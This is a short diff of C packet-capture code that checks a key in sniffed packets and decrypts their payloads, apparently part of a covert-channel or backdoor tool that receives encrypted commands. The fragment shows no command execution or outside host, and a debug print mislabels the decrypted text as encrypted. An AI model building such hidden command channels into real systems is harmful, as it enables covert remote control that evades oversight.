@@ -137,9 +137,6 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         } else {
             printf("Packet tossed wrong key\n");
         }
-    } else if((off & 0x1fff) == 0){
-        printf("IP: %s\n", inet_ntoa(ip->ip_src));
-        printf("%s %d %d %d %d\n", inet_ntoa(ip->ip_dst), hlen, version, len, off);
     }
 
 }
@@ -191,11 +188,12 @@ void ParsePayload(const u_char *payload, int len){
     //parse the first x bytes for the key
     //parse the rest into a struct
 
-    //unsigned char decryptedtext[128];
-    //int decryptedlen, cipherlen;
-    //cipherlen = strlen((char*)payload);
-    //decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, key, iv, decryptedtext);
-    printf("Payload text is: %s \n", payload);
+    unsigned char decryptedtext[BUFSIZE];
+    int decryptedlen, cipherlen;
+    cipherlen = strlen((char*)payload);
+    printf("Encrypted Payload is: %s \n", payload);
+    decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, key, iv, decryptedtext);
+    printf("Encrypted Payload is: %s \n", decryptedtext);
 }
 
 void CreatePayload(char *command, unsigned char *encrypted){
